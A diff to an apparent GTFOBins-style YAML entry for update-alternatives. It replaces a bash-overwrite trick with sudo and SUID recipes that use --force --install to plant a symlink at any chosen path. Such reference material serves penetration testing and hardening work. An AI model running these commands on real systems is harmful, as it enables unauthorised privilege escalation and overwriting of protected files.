@@ -1,8 +1,17 @@
 ---
 functions:
   sudo:
-    - description: Replace existing binary with symlink pointing to user supplied binary
+    - description: Write in `$LFILE` a symlink to `$TF`.
       code: |
-        cp file_to_replace_bash /tmp/bash
-        sudo update-alternatives --force --install /bin/bash bash /tmp/bash 1
+        LFILE=/path/to/file_to_write
+        TF=$(mktemp)
+        echo DATA >$TF
+        sudo update-alternatives --force --install "$LFILE" x "$TF" 0
+  suid:
+    - description: Write in `$LFILE` a symlink to `$TF`.
+      code: |
+        LFILE=/path/to/file_to_write
+        TF=$(mktemp)
+        echo DATA >$TF
+        ./update-alternatives --force --install "$LFILE" x "$TF" 0
 ---
